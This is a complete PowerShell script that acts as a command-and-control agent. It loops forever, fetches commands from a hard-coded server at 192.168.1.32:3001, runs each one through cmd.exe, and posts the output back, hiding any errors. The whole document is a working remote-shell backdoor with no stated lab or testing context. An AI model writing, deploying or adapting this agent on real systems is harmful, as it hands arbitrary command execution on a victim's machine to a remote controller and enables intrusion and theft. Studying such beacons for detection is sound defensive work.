$base = "http://192.168.1.32:3001/api/win7"
$wc = New-Object Net.WebClient

while ($true) {
  try {
    $json = $wc.DownloadString("$base/cmd")
    $m = [regex]::Match($json, '"cmd"\s*:\s*"((?:[^"\\]|\\.)*)"')
    if ($m.Success) {
      $cmd = $m.Groups[1].Value
      $cmd = $cmd.Replace('\"', '"').Replace('\\', '\')
      if ($cmd.Length -gt 0) {
        $out = & cmd.exe /c $cmd 2>&1 | Out-String
        $out = $out.Replace('\', '\\').Replace('"', '\"').Replace("`r", '').Replace("`n", '\n')
        $body = '{"output":"' + $out + '"}'
        $wc.Headers.Add("Content-Type", "application/json")
        $null = $wc.UploadString("$base/result", "POST", $body)
      }
    }
  } catch {
  }
  Start-Sleep -Seconds 4
}
